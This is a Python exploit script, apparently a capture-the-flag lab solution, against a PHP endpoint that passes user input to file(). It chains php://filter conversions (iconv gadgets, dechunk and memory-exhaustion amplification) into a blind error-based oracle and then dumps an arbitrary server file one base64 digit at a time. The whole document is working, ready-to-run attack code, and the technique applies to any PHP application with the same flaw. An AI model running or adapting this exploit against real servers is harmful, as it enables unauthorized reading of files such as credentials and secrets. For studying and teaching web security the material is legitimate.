#!/usr/bin/env python3
"""
Lab 13 - error-based PHP filter-chain oracle against:

    <?php file($_POST[0]);

The service produces no output whatsoever.  The only thing that leaks is
whether PHP died on "Allowed memory size exhausted" -> Apache answers 500
instead of 200.  That single bit is enough to dump an arbitrary file.

Three primitives are combined (see WRITEUP.md):

  1. `dechunk`                     - erases the stream iff its first byte is a
                                     hex digit  -> a conditional "erase".
  2. `convert.iconv.L1.UCS-4LE`    - multiplies the stream length by 4; repeat
                                     ~18 times and any non-empty stream blows
                                     past memory_limit -> 500.
  3. charset / base64 gymnastics   - rotate the byte we want into position 0
                                     and map it onto (not) a hex digit.

Python 3 standard library only.
"""
import base64
import json
import re
import sys
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from http.client import HTTPConnection

# --------------------------------------------------------------------------
# filter building blocks
# --------------------------------------------------------------------------
BLOW = "convert.iconv.L1.UCS-4LE"          # x4 per application
DECHUNK = "dechunk"
KRJUNK = "convert.iconv..CSISO2022KR"      # prepends \x1b$)C
QPE = "convert.quoted-printable-encode"

# positional gadgets (found by @loknop / @hashkitten, see WRITEUP.md)
R2 = "convert.iconv.CSUNICODE.UCS-2BE"                 # swap every pair
R4 = "convert.iconv.UCS-4LE.10646-1:1993"              # reverse every 4 chars
FLIP = "|".join([QPE, QPE] + ["convert.iconv.L1.utf7"] * 4 +
                ["convert.iconv.CSUNICODE.CSUNICODE", R4,
                 "convert.base64-decode", "convert.base64-encode"])

B64A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

# Decision tree over the 64 base64 digits.  Every node is
#   [filter_chain, subtree_if_first_byte_is_a_hexdigit, subtree_otherwise]
# and every leaf is the recovered digit.  Generated offline by brute forcing
# every `convert.iconv.<a>.<b>` pair available in glibc (see WRITEUP.md).
TREE = json.loads(r'''["convert.iconv.UTF8.UTF16LE|convert.base64-encode|convert.iconv.CSUNICODE.UCS-2BE|convert.iconv.CP297.CP280",["convert.iconv.UTF8.UTF16LE|convert.base64-encode|convert.iconv.CSUNICODE.UCS-2BE",["string.toupper|convert.iconv.CP280.CP297|string.rot13",["convert.iconv.500.CP280",["convert.base64-encode|string.rot13",["convert.base64-encode|convert.iconv.500.1047|string.rot13","4","8"],["string.rot13","0","d"]],["","D",["convert.base64-encode","p","P"]]],["convert.base64-encode",["convert.base64-encode|string.rot13|convert.iconv.500.CP937|string.rot13",["convert.base64-encode|convert.iconv.500.CP937","h","l"],["convert.iconv.CP1390.IBM932|string.rot13","x","t"]],["convert.base64-encode|string.rot13|convert.iconv.500.CP273",["convert.base64-encode|string.rot13","H","X"],["convert.iconv.CP1399.CP930|string.rot13","T","L"]]]],["convert.iconv.CP297.CP280",["string.rot13",["convert.base64-encode|string.rot13",["convert.base64-encode|convert.iconv.500.1047|string.rot13","5","9"],["","1","Q"]],["convert.iconv.CA.CP930",["convert.iconv.500.CP937","a","e"],["convert.iconv.CP1399.CP930","E","A"]]],["convert.base64-encode",["convert.iconv.500.CP278|string.rot13",["string.rot13","q","y"],["convert.iconv.CP284.CP278","i",["convert.base64-encode|string.toupper|convert.iconv.500.CP280","m","u"]]],["convert.base64-encode|string.rot13|convert.iconv.500.CP273",["convert.base64-encode|string.rot13","I","Y"],["string.rot13|convert.iconv.1047.500|string.rot13","M","U"]]]]],["convert.iconv.UTF8.UTF16LE|convert.base64-encode|convert.iconv.CSUNICODE.UCS-2BE|convert.iconv.CP1390.IBM932",["string.toupper|convert.iconv.500.CP273",["convert.iconv.CP1399.CP930",["string.rot13",["convert.base64-encode|string.rot13","6","2"],["convert.iconv.CP1390.CP939","B","F"]],["",["convert.iconv.CA.CP930","b","f"],["convert.base64-encode","j","J"]]],["string.rot13",["convert.base64-encode",["convert.iconv.500.CP937|string.rot13","n","r"],["convert.iconv.500.CP937|string.rot13","N","R"]],["convert.base64-encode",["string.rot13|convert.iconv.CP284.CP278","v","z"],["convert.iconv.1047.500|string.rot13","Z","V"]]]],["string.toupper|convert.iconv.CP273.CP297|string.rot13",["",["string.rot13",["convert.base64-encode|string.rot13","7","3"],["convert.iconv.CA.CP930","c","C"]],["convert.base64-encode",["string.rot13|convert.iconv.CA.CP930","o","s"],["convert.iconv.500.1047|string.rot13","S","O"]]],["string.tolower|convert.iconv.CA.CP930|string.rot13",["convert.base64-encode","k",["convert.iconv.CA.500|string.rot13","+","K"]],["string.toupper|convert.iconv.CP1399.CP930",["convert.iconv.CP1399.CP930","G","g"],["convert.iconv.CA.500","/",["convert.base64-encode","w","W"]]]]]]]''')


def get_nth(n):
    """Filter chain that rotates base64 digit #n to offset 0."""
    out = []
    chunk = n // 2
    if chunk % 2:
        out.append(R4)
    out += [FLIP, R4] * (chunk // 2)
    if (n % 2) ^ (chunk % 2):
        out.append(R2)
    return "|".join(out)


# --------------------------------------------------------------------------
# the oracle
# --------------------------------------------------------------------------
class Oracle:
    def __init__(self, base, path):
        u = urllib.parse.urlsplit(base if "://" in base else "http://" + base)
        self.host = u.hostname
        self.port = u.port or 80
        self.uri = u.path or "/"
        self.path = path
        self.requests = 0
        self._lock = threading.Lock()
        self._tls = threading.local()

    def _conn(self):
        c = getattr(self._tls, "c", None)
        if c is None:
            c = self._tls.c = HTTPConnection(self.host, self.port, timeout=30)
        return c

    def raw(self, chain):
        """True when PHP died -> the stream was NOT empty."""
        body = urllib.parse.urlencode(
            {"0": "php://filter/%s/resource=%s" % (chain, self.path)})
        hdr = {"Content-Type": "application/x-www-form-urlencoded",
               "Content-Length": str(len(body))}
        for attempt in range(3):
            try:
                c = self._conn()
                c.request("POST", self.uri, body, hdr)
                r = c.getresponse()
                r.read()
                with self._lock:
                    self.requests += 1
                return r.status == 500
            except Exception:
                try:
                    self._tls.c.close()
                except Exception:
                    pass
                self._tls.c = None
        raise RuntimeError("target unreachable")

    def survives(self, chain, blow):
        """True when `chain` leaves a non-empty stream behind."""
        return self.raw(chain + "|" + "|".join([BLOW] * blow))

    def is_hex(self, chain, blow):
        """True when the first byte of `chain`'s output is [0-9a-fA-F]."""
        return not self.survives(chain + "|" + DECHUNK, blow)


def classify(orc, prefix, blow):
    node = TREE
    while not isinstance(node, str):
        chain = prefix + ("|" + node[0] if node[0] else "")
        node = node[1] if orc.is_hex(chain, blow) else node[2]
    return node


# --------------------------------------------------------------------------
def main():
    base = sys.argv[1] if len(sys.argv) > 1 else "http://challenge"
    target = sys.argv[2] if len(sys.argv) > 2 else "/flag.txt"
    orc = Oracle(base, target)

    print("[*] target      %s" % base)
    print("[*] file to dump %s" % target)

    # ---- 1. calibrate the amplifier -------------------------------------
    # smallest number of UCS-4LE hops that makes the doubly-base64'd file
    # blow past memory_limit.
    if not orc.survives(header(0), 24):
        sys.exit("[!] no memory error at all - wrong target, empty file or "
                 "memory_limit=-1")
    lo, hi = 0, 24
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        if orc.survives(header(0), mid):
            hi = mid
        else:
            lo = mid
    w0 = hi
    blow = w0 + 6                 # margin: one surviving byte must blow up
    print("[*] amplifier   x4 per hop, %d hops kill the stream, using %d" %
          (w0, blow))

    # ---- 2. pick the CSISO2022KR padding --------------------------------
    # The positional gadget needs the doubly-base64'd stream to end in "==".
    # quoted-printable-encode rewrites every '=' as '=3D', i.e. it adds two
    # bytes per '=' per application - so with a *weak* amplifier (one hop
    # below the kill threshold) enough QPE rounds only tip the stream over
    # when a padding '=' is present.  Exactly one of the three junk lengths
    # produces a stream whose length is a multiple of 3, i.e. no '=' at all.
    weak = max(0, w0 - 1)
    k = None
    for rounds in (64, 256, 1024, 4096):
        pad = "|".join([QPE] * rounds + [BLOW] * weak)
        eq = [orc.raw(header(c) + "|" + pad) for c in range(3)]
        if eq.count(False) == 1:
            k = (eq.index(False) + 1) % 3
            break
    if k is None:
        sys.exit("[!] could not determine the base64 padding")
    print("[*] padding     %d x CSISO2022KR junk block(s)" % k)

    head = header(k)

    # ---- 3. dump the doubly-base64 stream, digit by digit ---------------
    digits = []
    flag = None
    pool = ThreadPoolExecutor(max_workers=int(
        sys.argv[3]) if len(sys.argv) > 3 else 8)
    n = 0
    while n < 4096 and flag is None:
        wave = list(range(n, n + 8))
        got = list(pool.map(
            lambda i: classify(orc, head + "|" + get_nth(i) if get_nth(i)
                               else head, blow), wave))
        digits += got
        n += len(wave)
        sys.stdout.write("\r[*] %3d digits  %5d requests   %s" %
                         (len(digits), orc.requests, "".join(digits)[-46:]))
        sys.stdout.flush()
        flag = decode(digits, k)
    print()
    pool.shutdown()

    if flag is None:
        print("[!] no PHRACK{...} in the recovered data, raw dump follows:")
        print(repr(rawdump(digits, k)))
        sys.exit(1)
    print("[*] %d requests total" % orc.requests)
    print("FLAG: %s" % flag)


def header(k):
    return "|".join(["convert.base64-encode"] + [KRJUNK] * k +
                    ["convert.base64-encode"])


def rawdump(digits, k):
    """Everything we could decode, flag or not."""
    s = "".join(digits)
    s = s[:len(s) - len(s) % 4]
    inner = base64.b64decode(s)[4 * k:] if s else b""
    m = re.match(rb"[A-Za-z0-9+/]*", inner).group()
    m = m[:len(m) - len(m) % 4]
    try:
        return base64.b64decode(m)
    except Exception:
        return b""


def decode(digits, k):
    """Best effort decode of the recovered outer-base64 digits."""
    s = "".join(digits)
    s = s[:len(s) - len(s) % 4]
    if not s:
        return None
    raw = base64.b64decode(s)
    inner = raw[4 * k:]
    m = re.match(rb"[A-Za-z0-9+/]*", inner).group()
    m = m[:len(m) - len(m) % 4]
    if not m:
        return None
    try:
        out = base64.b64decode(m)
    except Exception:
        return None
    hit = re.search(rb"PHRACK\{[^}]*\}", out)
    return hit.group().decode() if hit else None


if __name__ == "__main__":
    main()
